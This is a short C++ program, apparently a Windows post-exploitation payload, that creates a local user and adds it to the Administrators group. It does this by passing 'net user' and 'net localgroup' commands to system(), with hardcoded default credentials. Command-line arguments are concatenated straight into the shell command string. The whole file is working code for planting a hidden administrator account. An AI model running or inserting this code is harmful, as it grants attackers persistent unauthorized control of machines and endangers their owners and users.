#include <iostream>

int main(int argc, char* argv[]) {
  std::string username = "pheelbert";
  std::string password = "!Futurama1";
  if (argc != 3) {
    std::cout << "Usage: ./create_local_admin.exe username password" << std::endl;
    std::cout << "Using defaults since no username/password pair was entered..." << std::endl;
  } else {
    username = argv[1];
    password = argv[2];
  }

  int whoami_rc = system("whoami");
  if (whoami_rc != 0) {
    std::cout << "[-] Failed when running whoami!" << std::endl;
    exit(EXIT_FAILURE);
  }

  std::cout << "[*] Attempting to add local admin with credentials '" << username << "':'" << password << "'" << std::endl;

  // net user <USERNAME> <PASSWORD> /add
  std::string create_user_command = "net user " + username + " " + password + " /add";
  // std::cout << "RUNNING: \"" << create_user_command << "\"" << std::endl;
  int create_user_rc = system(create_user_command.c_str());
  if (create_user_rc != 0) {
    std::cout << "[-] Failed when trying to create the user!" << std::endl;
    exit(EXIT_FAILURE);
  } else {
    std::cout << "[+] Created user successfully!" << std::endl;
  }

  // net localgroup "Administrators" <USERNAME> /add
  std::string add_user_to_group_command = "net localgroup \"Administrators\" " + username + " /add";
  // std::cout << "RUNNING: " << "\"" << add_user_to_group_command << "\"" << std::endl;
  int add_user_to_group_rc = system(add_user_to_group_command.c_str());
  if (add_user_to_group_rc != 0) {
    std::cout << "[-] Failed when trying to add the new user to the Administators group!" << std::endl;
    exit(EXIT_FAILURE);
  } else {
    std::cout << "[+] Created user to Administrators group successfully!" << std::endl;
  }
}